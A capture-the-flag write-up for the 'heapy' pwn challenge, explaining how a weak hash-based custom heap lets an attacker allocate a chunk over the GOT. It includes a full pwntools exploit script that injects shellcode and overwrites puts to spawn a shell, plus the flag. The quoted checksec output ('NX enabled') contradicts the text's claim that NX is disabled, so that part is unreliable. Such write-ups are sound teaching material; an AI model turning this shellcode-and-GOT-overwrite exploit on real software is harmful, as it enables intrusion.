# Writeup for heapy (pwn, 800 pts, 4 solves), Kaizen CTF at Blackhat 2017

Description:

> Other CTF competitions have custom heap challenges with trivial overflows. Here at Kaizen, we ensure that our custom heaps contain 0% overflowable buffers.
> `nc challenges.kaizen-ctf.com 10055`

## TL;DR

- hash-based custom heap
- faulty implementation -> allocate chunks at attacker-controlled location
- allocate chunk over GOT
- overwrite GOT

## Analysing the Target

We perform some quick checks, before reversing the binary:

```
> file heapy
heapy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1421182e6b43c3ecab7eb8745fc7fad574921f5c, not stripped
```
32-bit binary, dynamically linked, not stripped

```
> pwn checksec heapy
[*] 'heapy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
All exploit mitigation techniques are turned off: no RELRO, no stack canary, NX and PIE are disabled.

After these checks, we take a look at its functionality; we can:
- create pastes, specifying their size
- write to a paste by id (no buffer overflow here)
- delete a paste by id
- read a paste by id
- exit 

After statically analysing the binary, we see that a custom hash-based heap implementation `halloc` is used.
`halloc` computes a weak hash from the requested size (`(0x9E3779B1 * size) % 0xFFFFFFFF`), interprets this hash as an address, and `mmap`s a chunk there.

## The Exploit

We bruteforce the hash for addresses near the global offset table, so that we can allocate a paste over the GOT and overwrite some GOT entries with the address to our shellcode.

Since NX is disabled, we allocate a chunk and write our shellcode to it. Using the hash formula, we can calculate the address the shellcode will end up at.

Putting everything together, we end up with the following exploit script:
```python
from pwn import *
import ctypes

LOCAL_BINARY = './heapy'

context.binary = LOCAL_BINARY

SC_SPEC_SIZE = 1000

proc = None
def connect():
    global proc
    if args['REMOTE']:
        proc = remote('challenges.kaizen-ctf.com', 10055)
    else:
        proc = process(LOCAL_BINARY)

def hash(n):
    return ctypes.c_uint32(0x9E3779B1 * n).value, ctypes.c_uint32(n).value

if __name__ == '__main__':

    """
    # bruteforce hash to find an address near the GOT
    for i in xrange(-(2**31), 2**31):
        addr, size = hash(i)
        if i % 1000000 == 0:
            print(size)
        if 0x8049000 <= addr <= 0x804a000:
            print("%d - 0x%08x" % (size, addr))
    # found: 2155026857 - 0x08049ed9
    """
    
    connect()

    sc = '\x90'*4 + asm(shellcraft.sh()) + '\x90'*4

    addr_sc, size_sc = hash(SC_SPEC_SIZE)
    if len(sc) > size_sc: log.error("sc too large")
    log.info("addr_sc: 0x%x", addr_sc)

    # create legit chunk at addr_sc and write shellcode
    proc.sendlineafter('Exit', '1')
    proc.sendlineafter('big is', str(size_sc))
    proc.sendlineafter('Exit', '2')
    proc.sendlineafter('paste would', '0')
    proc.sendlineafter('your input', sc)

    # create chunk in front of GOT (0x08049ed9 - 3 bytes read, 4 bytes printf, 4 bytes puts)
    proc.sendlineafter('Exit', '1')
    proc.sendlineafter('big is', '2155026857')
    # overwrite puts with addr of sc
    proc.sendlineafter('Exit', '2')
    proc.sendlineafter('paste would', '1')
    proc.sendlineafter('your input', '\x00'*7 + p32(addr_sc))

    proc.interactive()
```
Flag: `KAIZEN{was_1t_4_he4p_bug}`
